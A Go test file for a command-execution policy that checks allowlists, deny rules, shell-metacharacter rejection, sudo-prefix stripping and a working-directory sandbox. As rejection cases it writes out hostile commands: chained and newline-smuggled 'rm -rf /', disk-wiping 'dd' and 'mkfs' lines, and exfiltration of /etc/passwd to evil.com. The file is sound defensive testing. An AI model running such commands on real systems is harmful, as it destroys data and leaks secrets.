package ops

import (
	"strings"
	"testing"
)

// ── Policy tests: the command boundary ──────────────────────────
//
// These cases are the specification for what may and may not run.
// The metacharacter cases matter most: they are the difference
// between an allowlist and a false sense of safety.

func newTestPolicy(t *testing.T, mode string, allow []string) *Policy {
	t.Helper()
	p, err := NewPolicy(PolicyConfig{Mode: mode, Allow: allow}, nopLogger{})
	if err != nil {
		t.Fatalf("NewPolicy: %v", err)
	}
	return p
}

func TestCheckCommand_BuiltinReadOnlyAllowed(t *testing.T) {
	p := newTestPolicy(t, "allowlist", nil)

	allowed := []string{
		"ls",
		"ls -la",
		"ls -la /data",
		"cat /etc/nginx/nginx.conf",
		"head -n 20 /var/log/syslog",
		"tail -n 50 /var/log/syslog",
		"wc -l /etc/passwd",
		"stat /etc/hosts",
		"df -h",
		"du -sh /data",
		"grep error /var/log/syslog",
		"ps",
		"uptime",
		"whoami",
		"id",
		"uname -a",
		"hostname",
		"systemctl status nginx",
		"systemctl is-active nginx",
		"journalctl -u nginx -n 100 --no-pager",
		"docker ps",
		"docker logs myapp",
		"git status",
		"git log",
		"ss -tlnp",
		"ip addr show",
	}

	for _, cmd := range allowed {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil", cmd, err)
		}
	}
}

// TestCheckCommand_MetacharactersRejected is the most important test
// in the package. Every one of these would defeat allowlist matching
// if the metacharacter scan did not run first.
func TestCheckCommand_MetacharactersRejected(t *testing.T) {
	p := newTestPolicy(t, "allowlist", nil)

	// Each entry is a command that contains an allowed prefix but
	// chains, redirects or substitutes something else.
	attacks := []string{
		"ls; rm -rf /",
		"ls && rm -rf /",
		"ls || rm -rf /",
		"ls | rm -rf /",
		"ls `rm -rf /`",
		"ls $(rm -rf /)",
		"ls > /etc/passwd",
		"ls >> /etc/passwd",
		"ls < /etc/shadow",
		"ls & rm -rf /",
		"ls\nrm -rf /",
		"ls\r\nrm -rf /",
		"cat /etc/passwd | mail attacker@evil.com",
		"grep x /etc/passwd; curl evil.com",
	}

	for _, cmd := range attacks {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want rejection", cmd)
		}
	}
}

func TestCheckCommand_DenyWinsOverAllow(t *testing.T) {
	// rm is in the built-in deny set. Even in free mode — where the
	// allowlist does not apply — deny must still block it.
	for _, mode := range []string{"allowlist", "free"} {
		p := newTestPolicy(t, mode, nil)
		for _, cmd := range []string{"rm -rf /data", "rm file.txt", "sudo rm -rf /"} {
			if err := p.CheckCommand(cmd); err == nil {
				t.Errorf("mode=%s: CheckCommand(%q) = nil, want deny", mode, cmd)
			}
		}
	}
}

func TestCheckCommand_DenyDefaultsAndOverride(t *testing.T) {
	// Default deny set applies when Deny is nil.
	p, err := NewPolicy(PolicyConfig{Mode: "free"}, nopLogger{})
	if err != nil {
		t.Fatal(err)
	}
	if err := p.CheckCommand("shutdown -h now"); err == nil {
		t.Error("shutdown should be denied by default")
	}

	// An explicit empty (non-nil) list clears the defaults, matching
	// how index.excludeFiles behaves in the main package.
	p2, err := NewPolicy(PolicyConfig{Mode: "free", Deny: []string{}}, nopLogger{})
	if err != nil {
		t.Fatal(err)
	}
	if err := p2.CheckCommand("shutdown -h now"); err != nil {
		t.Errorf("explicit empty deny should clear defaults, got %v", err)
	}
}

// TestCheckCommand_NoFalsePositivesOnPaths guards against the deny
// rules matching a command name that merely appears inside a path
// argument. An unanchored \bmv\b rejects `ls /data/mvtest`, and
// \bmount\b rejects `cat /etc/mount.conf` — both are legitimate reads.
func TestCheckCommand_NoFalsePositivesOnPaths(t *testing.T) {
	p := newTestPolicy(t, "allowlist", nil)

	legit := []string{
		"ls /data/mvtest",
		"ls /var/log/dd",
		"cat /etc/mount.conf",
		"cat /etc/passwd",
		"wc -l /etc/passwd",
		"ls /data/kill_switch",
		"ls /data/rmfile.txt",
		"grep rm /var/log/syslog",
		"find /data -maxdepth 2 -type f",
		"ls /data/truncate.log",
		"cat /etc/at.conf",
		"ls /data/chmod_notes.md",
	}

	for _, cmd := range legit {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil (false positive)", cmd, err)
		}
	}
}

// TestCheckCommand_DangerousCommandsDenied verifies the anchored deny
// rules still catch the real thing.
func TestCheckCommand_DangerousCommandsDenied(t *testing.T) {
	for _, mode := range []string{"allowlist", "free"} {
		p := newTestPolicy(t, mode, nil)
		dangerous := []string{
			"rm -rf /data",
			"rm file.txt",
			"mkfs.ext4 /dev/sda1",
			"dd if=/dev/zero of=/dev/sda",
			"shutdown -h now",
			"reboot",
			"chmod 777 /etc/shadow",
			"chown root:root /data",
			"useradd attacker",
			"passwd root",
			"crontab -e",
			"iptables -F",
			"mount /dev/sda1 /mnt",
			"umount /data",
			"apt-get install something",
			"killall nginx",
			"cat /dev/sda",
		}
		for _, cmd := range dangerous {
			if err := p.CheckCommand(cmd); err == nil {
				t.Errorf("mode=%s: CheckCommand(%q) = nil, want denial", mode, cmd)
			}
		}
	}
}

// TestCheckCommand_NewlineSeparatorRejected guards a specific bypass:
// normalization collapses \n into a space, so the metacharacter scan
// must run on the raw string or `ls\nrm -rf /` looks like a harmless
// `ls rm -rf /`.
func TestCheckCommand_NewlineSeparatorRejected(t *testing.T) {
	p := newTestPolicy(t, "allowlist", nil)

	for _, cmd := range []string{
		"ls\nrm -rf /",
		"ls\r\nrm -rf /",
		"ls\rrm -rf /",
		"cat /etc/passwd\ncurl evil.com",
	} {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want rejection (newline separator)", cmd)
		}
	}
}

// TestCheckCommand_PrivilegePrefixStripped guards another bypass:
// anchored deny rules such as ^\s*rm\b are defeated by a `sudo`
// prefix unless the wrapper is removed before matching.
func TestCheckCommand_PrivilegePrefixStripped(t *testing.T) {
	for _, mode := range []string{"allowlist", "free"} {
		p := newTestPolicy(t, mode, nil)

		bypasses := []string{
			"sudo rm -rf /data",
			"doas rm -rf /data",
			"pkexec rm -rf /data",
			"sudo env rm -rf /data",
			"nohup rm -rf /data",
			"sudo chmod 777 /etc/shadow",
			"sudo shutdown -h now",
			"sudo useradd attacker",
			"sudo apt-get install evil",
		}
		for _, cmd := range bypasses {
			if err := p.CheckCommand(cmd); err == nil {
				t.Errorf("mode=%s: CheckCommand(%q) = nil, want denial (privilege prefix bypass)", mode, cmd)
			}
		}
	}
}

// TestCheckCommand_PrivilegePrefixAllowedWhenCommandIsSafe verifies the
// stripping does not over-reject: a privileged read-only command is
// still judged by what it actually runs.
func TestCheckCommand_PrivilegePrefixAllowedWhenCommandIsSafe(t *testing.T) {
	p := newTestPolicy(t, "allowlist", []string{`^systemctl (restart|reload) [\w@.\-]+$`})

	for _, cmd := range []string{
		"sudo systemctl reload nginx",
		"sudo ls -la /data",
	} {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil", cmd, err)
		}
	}
}

func TestStripPrivilegePrefix(t *testing.T) {
	cases := []struct{ in, want string }{
		{"sudo rm -rf /", "rm -rf /"},
		{"sudo env rm -rf /", "rm -rf /"},
		{"sudo doas rm -rf /", "rm -rf /"},
		{"ls -la", "ls -la"},
		{"sudo systemctl status nginx", "systemctl status nginx"},
	}
	for _, c := range cases {
		if got := stripPrivilegePrefix(c.in); got != c.want {
			t.Errorf("stripPrivilegePrefix(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestCheckCommand_FreeModeAllowsArbitraryButStillScans(t *testing.T) {
	p := newTestPolicy(t, "free", nil)

	// A command outside the built-in allowlist runs in free mode.
	if err := p.CheckCommand("myscript --flag"); err != nil {
		t.Errorf("free mode should allow arbitrary commands, got %v", err)
	}
	// But metacharacters are still refused.
	if err := p.CheckCommand("myscript; rm -rf /"); err == nil {
		t.Error("free mode must still reject metacharacters")
	}
}

func TestCheckCommand_AllowlistModeRejectsUnknown(t *testing.T) {
	p := newTestPolicy(t, "allowlist", nil)
	for _, cmd := range []string{"nginx -t", "myscript", "curl http://example.com"} {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want rejection in allowlist mode", cmd)
		}
	}
}

func TestCheckCommand_UserPatternsAppended(t *testing.T) {
	// Operator-supplied patterns extend the built-ins rather than
	// replacing them: ls must still work.
	p := newTestPolicy(t, "allowlist", []string{`^nginx -t$`, `^systemctl (restart|reload) [\w@.\-]+$`})

	for _, cmd := range []string{"ls", "nginx -t", "systemctl reload nginx", "systemctl restart myapp.service"} {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil", cmd, err)
		}
	}
}

func TestCheckCommand_WhitespaceNormalized(t *testing.T) {
	p := newTestPolicy(t, "allowlist", nil)

	// Extra internal whitespace must not let a command slip past, and
	// must not cause a false rejection either.
	for _, cmd := range []string{"ls    -la", "  ls -la  ", "ls\t-la"} {
		if err := p.CheckCommand(cmd); err != nil {
			t.Errorf("CheckCommand(%q) = %v, want nil after normalization", cmd, err)
		}
	}
}

func TestCheckCommand_EmptyRejected(t *testing.T) {
	p := newTestPolicy(t, "allowlist", nil)
	for _, cmd := range []string{"", "   ", "\t"} {
		if err := p.CheckCommand(cmd); err == nil {
			t.Errorf("CheckCommand(%q) = nil, want rejection", cmd)
		}
	}
}

func TestCheckCommand_BadPatternIsReported(t *testing.T) {
	if _, err := NewPolicy(PolicyConfig{Mode: "allowlist", Allow: []string{"([unclosed"}}, nopLogger{}); err == nil {
		t.Error("expected an error for an uncompilable allow pattern")
	}
}

func TestCheckCommand_BadModeIsReported(t *testing.T) {
	if _, err := NewPolicy(PolicyConfig{Mode: "yolo"}, nopLogger{}); err == nil {
		t.Error("expected an error for an unknown mode")
	}
}

// ── cwd sandbox tests ───────────────────────────────────────────

func TestCheckCWD_InsideRootAllowed(t *testing.T) {
	p, err := NewPolicy(PolicyConfig{Mode: "allowlist", Roots: []string{"/data"}}, nopLogger{})
	if err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{"/data", "/data/nginx", "/data/a/b/c"} {
		if err := p.CheckCWD(dir); err != nil {
			t.Errorf("CheckCWD(%q) = %v, want nil", dir, err)
		}
	}
}

func TestCheckCWD_OutsideRootRejected(t *testing.T) {
	p, err := NewPolicy(PolicyConfig{Mode: "allowlist", Roots: []string{"/data"}}, nopLogger{})
	if err != nil {
		t.Fatal(err)
	}
	for _, dir := range []string{"/etc", "/", "/datax", "/data/../etc"} {
		if err := p.CheckCWD(dir); err == nil {
			t.Errorf("CheckCWD(%q) = nil, want rejection", dir)
		}
	}
}

func TestCheckCWD_NoRootsMeansNoSandbox(t *testing.T) {
	// An empty roots list is an explicit opt-out, matching the
	// documented behaviour.
	p, err := NewPolicy(PolicyConfig{Mode: "allowlist"}, nopLogger{})
	if err != nil {
		t.Fatal(err)
	}
	if err := p.CheckCWD("/anywhere/at/all"); err != nil {
		t.Errorf("CheckCWD with no roots = %v, want nil", err)
	}
}

func TestCheckCWD_EmptyRejectedWhenSandboxed(t *testing.T) {
	p, err := NewPolicy(PolicyConfig{Mode: "allowlist", Roots: []string{"/data"}}, nopLogger{})
	if err != nil {
		t.Fatal(err)
	}
	if err := p.CheckCWD(""); err == nil {
		t.Error("empty cwd should be rejected when a sandbox is configured")
	}
}

// ── RingBuffer tests ────────────────────────────────────────────

func TestRingBuffer_UnderCapacity(t *testing.T) {
	r := NewRingBuffer(16)
	r.Write([]byte("hello"))
	if got := string(r.Bytes()); got != "hello" {
		t.Errorf("Bytes() = %q, want %q", got, "hello")
	}
}

func TestRingBuffer_WrapsAndKeepsNewest(t *testing.T) {
	r := NewRingBuffer(8)
	r.Write([]byte("abcde"))
	r.Write([]byte("fghij")) // wraps: only the last 8 bytes survive

	got := string(r.Bytes())
	if len(got) != 8 {
		t.Fatalf("Bytes() length = %d, want 8 (got %q)", len(got), got)
	}
	if got != "cdefghij" {
		t.Errorf("Bytes() = %q, want %q", got, "cdefghij")
	}
}

func TestRingBuffer_WriteLargerThanCapacity(t *testing.T) {
	r := NewRingBuffer(4)
	r.Write([]byte("0123456789"))
	if got := string(r.Bytes()); got != "6789" {
		t.Errorf("Bytes() = %q, want %q", got, "6789")
	}
}

func TestRingBuffer_EmptyWriteIsNoop(t *testing.T) {
	r := NewRingBuffer(8)
	r.Write([]byte("ab"))
	r.Write(nil)
	r.Write([]byte{})
	if got := string(r.Bytes()); got != "ab" {
		t.Errorf("Bytes() = %q, want %q", got, "ab")
	}
}

// ── hostMatch tests (Origin comparison) ─────────────────────────

func TestHostMatch(t *testing.T) {
	cases := []struct {
		pattern, host string
		want          bool
	}{
		{"192.168.1.118:8787", "192.168.1.118:8787", true},
		{"192.168.1.118", "192.168.1.118:8787", true}, // port-less pattern matches any port
		{"192.168.1.118:8787", "192.168.1.118:9999", false},
		{"evil.com", "192.168.1.118:8787", false},
		{"EXAMPLE.COM", "example.com", true}, // case-insensitive
		{"", "example.com", false},
		{"example.com", "", false},
	}
	for _, c := range cases {
		if got := hostMatch(c.pattern, c.host); got != c.want {
			t.Errorf("hostMatch(%q, %q) = %v, want %v", c.pattern, c.host, got, c.want)
		}
	}
}

// ── scanMetachars direct tests ──────────────────────────────────

func TestScanMetachars(t *testing.T) {
	if m := scanMetachars("ls -la"); m != "" {
		t.Errorf("clean command reported metachar %q", m)
	}
	for _, s := range []string{";", "&&", "||", "|", "`", "$(", ">", "<", "&"} {
		cmd := "ls " + s + " x"
		if m := scanMetachars(cmd); m == "" {
			t.Errorf("scanMetachars(%q) missed %q", cmd, s)
		}
	}
}

func TestNormalizeCommand(t *testing.T) {
	if got := normalizeCommand("  ls   -la  "); got != "ls -la" {
		t.Errorf("normalizeCommand = %q, want %q", got, "ls -la")
	}
	// Case is preserved: folding it would let "RM" through a rule for "rm".
	if got := normalizeCommand("RM -rf /"); !strings.Contains(got, "RM") {
		t.Errorf("normalizeCommand folded case: %q", got)
	}
}
